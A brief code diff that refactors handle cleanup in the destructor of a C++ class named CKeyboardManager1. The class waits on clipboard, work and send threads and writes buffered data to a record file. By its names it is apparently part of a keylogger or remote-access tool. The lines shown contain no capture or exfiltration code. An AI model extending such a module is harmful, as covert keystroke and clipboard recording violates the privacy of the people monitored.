@@ -61,9 +61,9 @@ CKeyboardManager1::~CKeyboardManager1()
     WaitForSingleObject(m_hClipboard, INFINITE);
     WaitForSingleObject(m_hWorkThread, INFINITE);
     WaitForSingleObject(m_hSendThread, INFINITE);
-    CloseHandle(m_hClipboard);
-    CloseHandle(m_hWorkThread);
-    CloseHandle(m_hSendThread);
+    SAFE_CLOSE_HANDLE(m_hClipboard);
+    SAFE_CLOSE_HANDLE(m_hWorkThread);
+    SAFE_CLOSE_HANDLE(m_hSendThread);
     m_Buffer->WriteAvailableDataToFile(m_strRecordFile);
     delete m_Buffer;
 }
